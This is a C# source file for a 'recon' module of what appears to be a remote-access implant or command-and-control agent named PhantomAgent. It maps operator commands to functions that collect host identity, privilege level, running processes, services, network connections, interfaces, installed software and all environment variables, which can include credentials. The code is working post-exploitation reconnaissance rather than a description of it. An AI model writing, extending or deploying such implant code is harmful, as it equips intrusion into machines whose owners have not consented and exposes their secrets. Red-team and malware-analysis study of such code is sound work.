using System.Diagnostics;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text.Json;
using Microsoft.Win32;

namespace PhantomAgent.Modules;

public static class Recon
{
    public const string Name = "recon";

    public static Dictionary<string, Func<Dictionary<string, JsonElement>?, object>> GetCommands()
    {
        return new Dictionary<string, Func<Dictionary<string, JsonElement>?, object>>
        {
            ["sysinfo"] = _ => GetSystemInfo(),
            ["ps"] = _ => GetProcesses(),
            ["services"] = _ => GetServices(),
            ["netstat"] = _ => GetNetConnections(),
            ["ifconfig"] = _ => GetInterfaces(),
            ["installed"] = _ => GetInstalledSoftware(),
            ["whoami"] = _ => GetWhoAmI(),
            ["env"] = _ => GetEnvironment(),
        };
    }

    private static Dictionary<string, object> GetSystemInfo()
    {
        return new Dictionary<string, object>
        {
            ["hostname"] = Environment.MachineName,
            ["username"] = Environment.UserName,
            ["domain"] = Environment.UserDomainName,
            ["os_version"] = Environment.OSVersion.ToString(),
            ["arch"] = RuntimeInformation.OSArchitecture.ToString(),
            ["process_arch"] = RuntimeInformation.ProcessArchitecture.ToString(),
            ["pid"] = Environment.ProcessId,
            ["clr_version"] = RuntimeInformation.FrameworkDescription,
            ["processor_count"] = Environment.ProcessorCount,
            ["system_dir"] = Environment.SystemDirectory,
            ["is_64bit_os"] = Environment.Is64BitOperatingSystem,
            ["is_64bit_proc"] = Environment.Is64BitProcess,
            ["uptime_seconds"] = Environment.TickCount64 / 1000,
            ["integrity"] = GetIntegrityLevel(),
        };
    }

    private static string GetIntegrityLevel()
    {
        if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            return Environment.UserName == "root" ? "high" : "medium";

        try
        {
            using var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
            var principal = new System.Security.Principal.WindowsPrincipal(identity);
            if (principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator))
                return identity.IsSystem ? "system" : "high";
            return "medium";
        }
        catch
        {
            return "medium";
        }
    }

    private static List<Dictionary<string, object>> GetProcesses()
    {
        var result = new List<Dictionary<string, object>>();
        foreach (var proc in Process.GetProcesses())
        {
            try
            {
                result.Add(new Dictionary<string, object>
                {
                    ["pid"] = proc.Id,
                    ["name"] = proc.ProcessName,
                    ["session_id"] = proc.SessionId,
                    ["memory_mb"] = proc.WorkingSet64 / (1024 * 1024),
                    ["threads"] = proc.Threads.Count,
                });
            }
            catch { }
            finally { proc.Dispose(); }
        }
        return result;
    }

    private static List<Dictionary<string, object>> GetServices()
    {
        var result = new List<Dictionary<string, object>>();
        if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            return result;

        try
        {
            foreach (var svc in ServiceController.GetServices())
            {
                try
                {
                    result.Add(new Dictionary<string, object>
                    {
                        ["name"] = svc.ServiceName,
                        ["display_name"] = svc.DisplayName,
                        ["status"] = svc.Status.ToString(),
                        ["type"] = svc.ServiceType.ToString(),
                        ["can_stop"] = svc.CanStop,
                    });
                }
                catch { }
                finally { svc.Dispose(); }
            }
        }
        catch { }
        return result;
    }

    private static List<Dictionary<string, object>> GetNetConnections()
    {
        var result = new List<Dictionary<string, object>>();
        try
        {
            var props = IPGlobalProperties.GetIPGlobalProperties();

            foreach (var conn in props.GetActiveTcpConnections())
            {
                result.Add(new Dictionary<string, object>
                {
                    ["protocol"] = "TCP",
                    ["local"] = $"{conn.LocalEndPoint}",
                    ["remote"] = $"{conn.RemoteEndPoint}",
                    ["state"] = conn.State.ToString(),
                });
            }

            foreach (var listener in props.GetActiveTcpListeners())
            {
                result.Add(new Dictionary<string, object>
                {
                    ["protocol"] = "TCP",
                    ["local"] = $"{listener}",
                    ["remote"] = "*:*",
                    ["state"] = "LISTENING",
                });
            }

            foreach (var listener in props.GetActiveUdpListeners())
            {
                result.Add(new Dictionary<string, object>
                {
                    ["protocol"] = "UDP",
                    ["local"] = $"{listener}",
                    ["remote"] = "*:*",
                    ["state"] = "",
                });
            }
        }
        catch { }
        return result;
    }

    private static List<Dictionary<string, string>> GetInterfaces()
    {
        var result = new List<Dictionary<string, string>>();
        foreach (var iface in NetworkInterface.GetAllNetworkInterfaces())
        {
            var addrs = iface.GetIPProperties().UnicastAddresses;
            foreach (var addr in addrs)
            {
                if (addr.Address.AddressFamily is AddressFamily.InterNetwork or AddressFamily.InterNetworkV6)
                {
                    result.Add(new Dictionary<string, string>
                    {
                        ["name"] = iface.Name,
                        ["ip"] = addr.Address.ToString(),
                        ["mac"] = iface.GetPhysicalAddress().ToString(),
                        ["status"] = iface.OperationalStatus.ToString(),
                        ["type"] = iface.NetworkInterfaceType.ToString(),
                    });
                }
            }
        }
        return result;
    }

    private static List<Dictionary<string, string>> GetInstalledSoftware()
    {
        var result = new List<Dictionary<string, string>>();
        if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            return result;

        string[] paths =
        {
            @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
            @"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall",
        };

        foreach (string regPath in paths)
        {
            try
            {
                using var key = Registry.LocalMachine.OpenSubKey(regPath);
                if (key == null) continue;

                foreach (string subKeyName in key.GetSubKeyNames())
                {
                    try
                    {
                        using var subKey = key.OpenSubKey(subKeyName);
                        string? name = subKey?.GetValue("DisplayName") as string;
                        if (string.IsNullOrEmpty(name)) continue;

                        result.Add(new Dictionary<string, string>
                        {
                            ["name"] = name,
                            ["version"] = subKey?.GetValue("DisplayVersion")?.ToString() ?? "",
                            ["publisher"] = subKey?.GetValue("Publisher")?.ToString() ?? "",
                            ["install_date"] = subKey?.GetValue("InstallDate")?.ToString() ?? "",
                        });
                    }
                    catch { }
                }
            }
            catch { }
        }
        return result;
    }

    private static Dictionary<string, string> GetWhoAmI()
    {
        return new Dictionary<string, string>
        {
            ["username"] = Environment.UserName,
            ["domain"] = Environment.UserDomainName,
            ["machine"] = Environment.MachineName,
            ["integrity"] = GetIntegrityLevel(),
        };
    }

    private static Dictionary<string, string> GetEnvironment()
    {
        var result = new Dictionary<string, string>();
        foreach (System.Collections.DictionaryEntry entry in Environment.GetEnvironmentVariables())
        {
            result[entry.Key?.ToString() ?? ""] = entry.Value?.ToString() ?? "";
        }
        return result;
    }
}
